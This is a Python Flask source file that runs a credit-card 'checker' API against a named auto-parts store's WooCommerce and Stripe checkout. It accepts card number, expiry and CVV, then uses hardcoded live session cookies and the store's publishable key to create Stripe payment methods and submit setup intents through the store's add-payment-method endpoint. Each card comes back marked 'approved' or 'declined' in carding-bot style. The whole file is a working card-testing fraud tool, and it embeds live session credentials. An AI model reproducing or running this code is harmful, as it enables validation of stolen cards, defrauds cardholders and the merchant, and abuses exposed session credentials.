from flask import Flask, request, jsonify
import requests
import json
import time
import re
import urllib.parse

app = Flask(__name__)

# ==========================================
# 🎯 CONFIGURATION
# ==========================================
DOMAIN = "https://infiniteautowerks.com"
STRIPE_PK = "pk_live_51MwcfkEreweRX4nmunyHnVjt6qSmKUgaafB7msRfg4EsQrStC8l0FlevFiuf2vMpN7oV9B5PGmIc7uNv1tdnvnTv005ZJCfrCk"

# 🍪 UPDATE COOKIES HERE MANUALLY
COOKIES = {
    'wordpress_sec_e7182569f4777e7cdbb9899fb576f3eb': 'syvyri%7C1771083748%7C3DURrnxtUajsodz96WXAkzxzkRW2fgcvL49ZK6Pp6p3%7Cd94d75c1fdfdf288e62cb6b66a10c2390af838774428cf1a850af4d249e3ff91',
    'checkout_continuity_service': '0a3d1867-f110-49bd-bfcd-ef8badf28651',
    'tk_or': '%22%22',
    'tk_lr': '%22%22',
    'tk_ai': 'rXt88lA3Me0RTe0YT26us8eo',
    '__stripe_mid': 'c51016f9-4a64-4d61-b8de-658a307e938c8046a4',
    'tk_r3d': '%22%22',
    'wordpress_logged_in_e7182569f4777e7cdbb9899fb576f3eb': 'syvyri%7C1771083748%7C3DURrnxtUajsodz96WXAkzxzkRW2fgcvL49ZK6Pp6p3%7Cde20a4d758669f845ad4556d732aca4ac5332998396a9f3c8714d87592347f48',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2026-01-31%2015%3A12%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_first_add': 'fd%3D2026-01-31%2015%3A12%3A05%7C%7C%7Cep%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%206.0%3B%20Nexus%205%20Build%2FMRA58N%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F144.0.0.0%20Mobile%20Safari%2F537.36',
    '__cf_bm': 'UOrZGtOF6t7DhDTZjCWZ61.x.6DokWWH3LjSGs9kviI-1769874285-1.0.1.1-eGH_yA5L7KNEyjSZ0M.FGxtPp_egMr4BqtEWVEbw3ItcHrpmORItEprED_IUFA0Ei9Fs5Skfv1m1DF8X07LvXtrTxBSkY_5No1W6PSp4ufI',
    'sbjs_session': 'pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Finfiniteautowerks.com%2Fmy-account%2Fadd-payment-method%2F',
    'tk_qs': '',
    '__stripe_sid': '348765c7-507a-403f-8af1-eca6193dc4082e88f2',
    'PHPSESSID': 'n05fqig3paubs7m4nail5ck9sn',
}

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return "None"

@app.route('/check', methods=['GET'])
def check_card():
    # URL Format: /check?cc=4532...|05|26|020
    folder_cc = request.args.get('cc')
    
    if not folder_cc:
        return jsonify({
            "status": "error",
            "message": "❌ Give me CC! Format: /check?cc=cc|mm|yy|cvv"
        })

    try:
        cc, mon, year, cvv = folder_cc.strip().split('|')
        year = year[-2:]
    except:
        return jsonify({
            "status": "error",
            "message": "❌ Invalid format! Use: cc|mm|yy|cvv"
        })

    session = requests.Session()
    session.cookies.update(COOKIES)

    # ==========================================
    # STEP 1: Get Nonce
    # ==========================================
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
    }
    
    try:
        req1 = session.get(f"{DOMAIN}/my-account/add-payment-method/", headers=headers, timeout=10)
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"❌ CONNECTION ERROR"
        })

    # Error Detection
    if req1.status_code == 403:
        return jsonify({
            "status": "declined",
            "message": "🚫 COOKIES EXPIRED - Access Denied (403)",
            "bot_message": f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: Cookies Expired (403)"
        })
    
    if "wp-login.php" in req1.text or "login" in req1.text.lower()[:500]:
        return jsonify({
            "status": "declined",
            "message": "🔐 COOKIES EXPIRED - Redirected to login",
            "bot_message": f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: Cookies Expired (Login Redirect)"
        })

    setup_intent_nonce = parseX(req1.text, '"createAndConfirmSetupIntentNonce":"', '"')
    
    if setup_intent_nonce == "None":
        return jsonify({
            "status": "declined",
            "message": "⚠️ NO NONCE - Update Cookies",
            "bot_message": f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: No Nonce Found - Update Cookies"
        })

    # ==========================================
    # STEP 2: Create Stripe PM
    # ==========================================
    headers2 = {
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    import uuid
    guid = str(uuid.uuid4())
    muid = str(uuid.uuid4())
    sid = str(uuid.uuid4())

    data2 = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_year]": year,
        "card[exp_month]": mon,
        "key": STRIPE_PK,
        "guid": guid,
        "muid": muid,
        "sid": sid,
        "payment_user_agent": "stripe.js/b22e1181d; stripe-js-v3/b22e1181d; split-card-element", 
        "time_on_page": "89234",
    }

    req2 = requests.post("https://api.stripe.com/v1/payment_methods", headers=headers2, data=data2, timeout=10)
    
    if req2.status_code != 200:
        try:
            err = req2.json()['error']['message']
        except:
            err = "Stripe Error"
        
        return jsonify({
            "status": "declined",
            "message": f"Stripe Declined: {err}",
            "bot_message": f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: {err}"
        })

    pm_id = req2.json().get('id')
    if not pm_id:
         return jsonify({
            "status": "error",
            "message": "No PM ID",
            "bot_message": f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: Failed to create PM"
        })

    # ==========================================
    # STEP 3: Charging
    # ==========================================
    headers3 = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": DOMAIN,
        "referer": f"{DOMAIN}/my-account/add-payment-method/",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    }

    data3 = {
        "action": "wc_stripe_create_and_confirm_setup_intent",
        "wc-stripe-payment-method": pm_id,
        "wc-stripe-payment-type": "card",
        "_ajax_nonce": setup_intent_nonce,
    }

    req3 = session.post(f"{DOMAIN}/wp-admin/admin-ajax.php", headers=headers3, data=data3, timeout=30)
    
    # ==========================================
    # RESPONSE HANDLING
    # ==========================================
    result_text = req3.text.strip()
    print(f"✅ RAW GATEWAY RESPONSE: {result_text}")
    
    # Check for empty/invalid response (cookies expired)
    if result_text == "0" or result_text == "" or len(result_text) < 5:
        return jsonify({
            "status": "declined",
            "message": "🔐 COOKIES EXPIRED - Invalid Session",
            "bot_message": f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: Cookies Expired (Response: {result_text})"
        })
    
    if '"success":true' in result_text:
        msg = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥\n𝗖𝗖: {folder_cc}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Infinite Auto Werks\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Authorized"
        status = "approved"
    elif "insufficient" in result_text.lower():
        msg = f"✅ ᴀᴘᴘʀᴏᴠᴇᴅ 🔥 (CVV)\n𝗖𝗖: {folder_cc}\n𝗚𝗮𝘁𝗲𝘄𝗮𝘆: Infinite Auto Werks\n𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: Insufficient Funds"
        status = "approved"
    else:
        # Extract Error
        try:
            js = req3.json()
            if 'data' in js and 'error' in js['data']:
                error_msg = js['data']['error']['message']
            elif 'message' in js:
                error_msg = js['message']
            else:
                error_msg = "Declined"
        except:
            if "declined" in result_text.lower():
                error_msg = "Your card was declined."
            else:
                 error_msg = f"Unknown Error (Response: {result_text[:50]})"

        msg = f"❌ ᴅᴇᴄʟɪɴᴇᴅ ❌\n𝗖𝗖: {folder_cc}\n𝗘𝗿𝗿𝗼𝗿: {error_msg}"
        status = "declined"

    return jsonify({
        "status": status,
        "response": error_msg if status == "declined" else "Authorized",
        "bot_message": msg
    })

if __name__ == '__main__':
    print("🚀 API Running on port 5000...")
    app.run(host='0.0.0.0', port=5000)
